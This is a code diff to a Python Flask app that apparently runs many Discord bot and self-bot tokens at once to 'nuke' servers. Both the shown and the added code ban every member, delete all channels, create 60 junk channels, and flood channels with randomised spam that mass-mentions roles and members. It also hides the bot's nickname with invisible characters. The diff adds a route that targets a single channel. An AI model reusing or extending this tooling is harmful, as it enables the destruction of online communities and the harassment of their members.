@@ -4,7 +4,7 @@ from flask import Flask, request, redirect, render_template
 app = Flask(__name__)
 
 logs = {}
-logIdInfos = {}
+logIdBotClass = {}
 stops = []
 discordApiBaseUrl = "https://discord.com/api/v9"
 
@@ -42,7 +42,7 @@ class DiscordBot(discord.Client):
         self.nukeLatency = latency
         self.messages = messages
         if mode == 0:
-            self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionServerIds = option
+            self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionChannelIds, self.channelId = option
         self.mode = mode
     async def banUser(self, user:discord.Member):
         try:
@@ -89,63 +89,49 @@ class DiscordBot(discord.Client):
     async def createChannel(self, channelName:str, guild:discord.Guild):
         channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
         await guild.create_text_channel(channelName)
-    async def nuke(self, latency:int, messages:list[str], guild:discord.Guild, channelName:str, numberOfExecutions=100):
+    async def oneNuke(self, messages:list[str], guild:discord.Guild, channel:discord.abc.GuildChannel, randomMention:bool, roles:list[discord.Role], members:list[discord.Member]):
+        for message in messages:
+            bMessage = message
+            if message == messages[0]:
+                bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
+            bMessage = bMessage.replace("!userId!", str(random.choice(guild.members).id))
+            if randomMention:
+                try:
+                    bRoles = roles
+                    if len(roles) >= 5:
+                        bRoles = random.sample(roles, 5)
+                    for role in bRoles:
+                        bMessage += f"<@&{role.id}> "
+                except:
+                    pass
+                bMessage += "\n"
+                try:
+                    bMembers = members
+                    if len(members) >= 12:
+                        bMembers = random.sample(members, 12)
+                    for member in bMembers:
+                        bMessage += f"<@{member.id}> "
+                except:
+                    pass
+                bMessage += "\n"
+            if message != self.messages[0]:
+                bMessage = message
+            await self.sendMessage(bMessage, channel, self.latency*0.001)
+    async def nuke(self, numberOfExecutions=45):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
-            if self.allChannelDelete:
-                await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
-            self.channels = list(guild.channels)
-            roles = list(self.guild.roles)
-            members = self.guild.members
-            # exclusion everyone
-            roles.remove(self.guild.default_role)
-            for _ in range(numberOfExecutions):
-                if self.logId in stops:
-                    logs.pop(self.logId)
+            self.guild = None
+            if not self.channelId:
+                self.guild = self.get_guild(self.guildId)
+                if not self.guild:
+                    logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
                     return
-                logs[self.logId] += "--- Nuke ---\n"
-                for channel in self.channels:
-                    if str(channel.id) in self.exclusionServerIds:
-                        continue
-                    for message in messages:
-                        bMessage = message
-                        if message == messages[0]:
-                            bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
-                        bMessage = bMessage.replace("{userId}", str(random.choice(guild.members).id))
-                        if self.randomMention:
-                            try:
-                                bRoles = roles
-                                if len(roles) >= 5:
-                                    bRoles = random.sample(roles, 5)
-                                for role in bRoles:
-                                    bMessage += f"<@&{role.id}> "
-                            except:
-                                pass
-                            bMessage += "\n"
-                            try:
-                                bMembers = members
-                                if len(members) >= 12:
-                                    bMembers = random.sample(members, 12)
-                                for member in bMembers:
-                                    bMessage += f"<@{member.id}> "
-                            except:
-                                pass
-                            bMessage += "\n"
-                        if message != messages[0]:
-                            bMessage = message
-                        await self.sendMessage(bMessage, channel, latency*0.001)
-                random.shuffle(self.channels)
-            await guild.leave()
-        except:
-            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
-        logs[self.logId] += "---- End ----\n"
-    async def on_ready(self):
-        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
-        self.guild = self.get_guild(self.guildId)
-        if not self.guild:
-            logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
-            return
-        if self.mode == 0:
+            else:
+                channel = self.get_channel(self.channelId)
+                if not channel:
+                    logs[self.logId] += f"Error: Not Found Channel - ID:{self.user.id}\n"
+                    return
+                self.guild = channel.guild
             try:
                 i = self.guild.get_member(self.user.id)
                 await i.edit(nick="឵᠎")
@@ -155,12 +141,34 @@ class DiscordBot(discord.Client):
                 await self.banAllUser(self.guild)
             if self.allChannelDelete:
                 await self.deleteAllChannel(self.guild)
-            await self.nuke(self.nukeLatency, self.messages, self.guild, self.channelName)
-        elif self.mode == 1:
-            try:
-                await self.guild.leave()
-            except:
-                pass
+                await asyncio.gather(*(self.createChannel(self.channelName, self.guild) for _ in range(60)))
+            channels = list(self.guild.channels)
+            roles = list(self.guild.roles)
+            members = self.guild.members
+            # exclusion everyone
+            roles.remove(self.guild.default_role)
+            for _ in range(numberOfExecutions):
+                if self.logId in stops:
+                    logs.pop(self.logId)
+                    return
+                logs[self.logId] += "--- Nuke ---\n"
+                if not self.channelId:
+                    random.shuffle(channels)
+                    for channel in channels:
+                        if str(channel.id) in self.exclusionChannelIds:
+                            continue
+                        await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
+                        random.shuffle(channels)
+                else:
+                    await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
+            await self.guild.leave()
+        except:
+            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
+        logs[self.logId] += "---- End ----\n"
+    async def on_ready(self):
+        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
+        if self.mode == 0:
+            await self.nuke()
     async def on_message(self, message):
         if message.author.bot:
             return
@@ -184,12 +192,12 @@ def getLog():
 @app.route('/stop', methods=["GET"])
 def stop():
     logId = request.args.get("id")
-    for token in logIdInfos[logId][0]:
-        bot = DiscordBot(logId, token, logIdInfos[logId][1], None, None, None, None, 1)
-        botThread = threading.Thread(target=bot.runBot, daemon=True)
-        botThread.start()
+    try:
+        asyncio.run(logIdBotClass[logId].guild.leave())
+    except:
+        pass
     stops.append(logId)
-    return redirect('nuke')
+    return redirect(request.referrer)
 
 @app.route('/joinGuild', methods=["GET", "POST"])
 def joinGuild():
@@ -212,6 +220,38 @@ def joinGuild():
         return render_template('selfBotJoinGuild.html', logId=logId)
     return render_template('selfBotJoinGuild.html')
 
+@app.route('/channelNuke', methods=["GET", "POST"])
+def channelNuke():
+    if request.method == "POST":
+        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
+        logs[logId] = "Start Pman Nuke PPP\n\n"
+        
+        tokens = request.form["tokens"].split("\r\n")
+        channelId = int(request.form["channelId"])
+        latency = int(request.form["latency"])
+        message = request.form["message"]
+        subMessages  = request.form["subMessages"].split("\r\n")
+        randomMention = "randomMention" in request.form
+        
+        logs[logId] += f"""-- Value you entered --
+Tokens:{tokens}
+ChannelID:{channelId}
+Latency:{latency}ms, {latency*0.001}s
+message:\n{message}\n
+subMessages:{subMessages}
+-- Options --
+RandomMention:{randomMention}
+
+"""
+        
+        for token in tokens:
+            bot = DiscordBot(logId, token, None, None, latency, ([message]*(len(subMessages)+2))+subMessages, [False, False, randomMention, None, channelId], 0)
+            logIdBotClass[logId] = bot
+            botThread = threading.Thread(target=bot.runBot, daemon=True)
+            botThread.start()
+        return render_template('selfBotChannelNuke.html', logId=logId)
+    return render_template('selfBotChannelNuke.html')
+
 @app.route('/nuke', methods=["GET", "POST"])
 def nuke():
     if request.method == "POST":
@@ -224,12 +264,10 @@ def nuke():
         latency = int(request.form["latency"])
         message = request.form["message"]
         subMessages  = request.form["subMessages"].split("\r\n")
-        exclusionServerIds = request.form["exclusionServerIds"].split(",")
+        exclusionChannelIds = request.form["exclusionChannelIds"].split(",")
         allUserBan = "allUserBan" in request.form
         allChannelDelete = "allChannelDelete" in request.form
         randomMention = "randomMention" in request.form
-        
-        logIdInfos[logId] = [tokens, guildId]
         
         logs[logId] += f"""-- Value you entered --
 Tokens:{tokens}
@@ -238,7 +276,7 @@ ChannelName:{channelName}
 Latency:{latency}ms, {latency*0.001}s
 message:\n{message}\n
 subMessages:{subMessages}
-exclusionServerIDs:{exclusionServerIds}
+exclusionChannelIDs:{exclusionChannelIds}
 -- Options --
 AllUserBan:{allUserBan}
 AllChannelDelete:{allChannelDelete}
@@ -247,7 +285,8 @@ RandomMention:{randomMention}
 """
         
         for token in tokens:
-            bot = DiscordBot(logId, token, guildId, channelName, latency, ([message]*(len(subMessages)+2))+subMessages, [allUserBan, allChannelDelete, randomMention, exclusionServerIds], 0)
+            bot = DiscordBot(logId, token, guildId, channelName, latency, ([message]*(len(subMessages)+2))+subMessages, [allUserBan, allChannelDelete, randomMention, exclusionChannelIds, None], 0)
+            logIdBotClass[logId] = bot
             botThread = threading.Thread(target=bot.runBot, daemon=True)
             botThread.start()
         return render_template('selfBotNuke.html', logId=logId)
